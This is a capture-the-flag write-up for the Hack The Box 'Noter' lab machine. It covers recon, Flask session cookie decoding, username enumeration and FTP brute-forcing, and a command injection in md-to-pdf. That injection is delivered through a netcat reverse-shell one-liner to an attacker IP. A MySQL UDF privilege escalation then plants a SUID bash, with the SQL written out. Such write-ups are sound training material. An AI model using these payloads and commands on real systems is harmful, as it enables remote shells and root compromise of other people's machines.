# Hack The Box: Noter

**Difficulty:** Medium
**OS:** Linux

Noter is a Medium difficulty Linux machine that features a note-taking application vulnerable to business logic flaws and command injection. The initial foothold involves identifying a username enumeration flaw, manipulating Flask session cookies to bypass authentication controls, and extracting FTP credentials to access source code. Remote Code Execution is achieved by exploiting a vulnerable markdown-to-pdf Node.js library. Privilege escalation takes advantage of a MySQL service running as root, allowing the loading of a malicious User-Defined Function (UDF) to obtain a root shell.

---

## Reconnaissance

Initial enumeration begins with an Nmap scan to identify open ports and running services.

```bash
nmap -p- --min-rate 10000 10.10.11.160
nmap -p 21,22,5000 -sCV 10.10.11.160
```

The scan identifies three open ports:
*   **Port 21:** FTP (vsftpd 3.0.3)
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 5000:** HTTP (Werkzeug httpd 2.0.2 / Python 3.8.10)

Anonymous FTP login is disabled. Port 5000 hosts the primary web application, a note-taking platform.

## Web Application Analysis

Navigating to the web server on port 5000 immediately redirects to a login portal. Testing the registration functionality (`/register`) allows for the creation of a standard user account. Upon authenticating, the application sets a session cookie and redirects to a dashboard (`/dashboard`) where notes can be created, viewed, and deleted.

### Authentication Flaws

Analyzing the session cookie reveals it is not a standard JWT, but rather a Flask session cookie. The contents can be decoded using `flask-unsign`.

```bash
flask-unsign --decode --cookie '<session_cookie_string>'
```

The decoded cookie payload structure appears as follows:
`{'_flashes': [('success', 'You are now logged in')], 'logged_in': True, 'username': 'testuser'}`

While the cookie is signed, cracking the secret key directly proves unfeasible with standard wordlists. However, testing the login portal reveals a discrepancy in the error messages returned by the application. Submitting an invalid username returns a generic "Invalid credentials" error, whereas submitting a valid username with an incorrect password returns a distinct error. This logic flaw allows for the enumeration of valid usernames registered on the platform.

Directory brute-forcing using tools like `feroxbuster` further maps out the application's attack surface, but the primary vector remains credential access.

### Extracting Source Code via FTP

Utilizing usernames enumerated from the login portal logic flaw, a brute-force attack against the FTP service is conducted. This yields successful authentication for the user `blue` utilizing a predictable, default password scheme.

Accessing the FTP service reveals backup archives containing the source code for the web application. Reviewing the application logic locally uncovers hardcoded administrative credentials and provides a comprehensive view of the backend architecture.

## Remote Code Execution

The source code review highlights a feature designed to export user notes into PDF format. The backend implementation relies on a local Node.js script, `md-to-pdf`, to process the markdown input.

```javascript
const { mdToPdf } = require('md-to-pdf');

(async () => {
  const pdf = await mdToPdf({ content: process.argv[2] }).catch(console.error);
})();
```

Further analysis of the `md-to-pdf` library version in use reveals it is vulnerable to command injection. The vulnerability stems from the library unsafely evaluating markdown parameters. 

By crafting a malicious note containing an embedded shell command, execution can be achieved when the application attempts the PDF conversion process.

```markdown
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 443 >/tmp/f)'
```

Triggering the export function executes the payload, resulting in a reverse shell as the `svc` user.

## Privilege Escalation

Initial enumeration of the local system as the `svc` user reveals minimal immediate escalation vectors. However, inspecting running services and systemd configurations uncovers a MySQL instance operating under the `root` user context.

```bash
cat /etc/systemd/system/mysql-start.service
```

The `app.py` web configuration file previously recovered via FTP contains credentials for a restricted database user. However, testing local MySQL access using default credentials (`root:Nildogg36`) grants full administrative access to the database.

### Exploitation via MySQL UDF

With root access to a MySQL instance running as the system `root` user, privilege escalation can be achieved by loading a custom User-Defined Function (UDF). The `raptor_udf2` exploit is well-suited for this scenario.

The exploit is compiled locally on the attacking machine:

```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

The resulting shared object (`raptor_udf2.so`) is transferred to the target system (e.g., `/dev/shm`).

Connecting to the MySQL instance, a temporary table is created to load the binary file, which is then dumped into the MySQL plugin directory.

```sql
create table foo(line blob);
insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

With the `do_system` function registered, system commands can now be executed as root. A copy of the bash binary is placed in `/tmp` and its SUID bit is set.

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash');
```

Executing the SUID binary grants a root shell, completing the compromise of the machine.

```bash
/tmp/rootbash -p
# id
uid=1001(svc) gid=1001(svc) euid=0(root) groups=1001(svc)
```
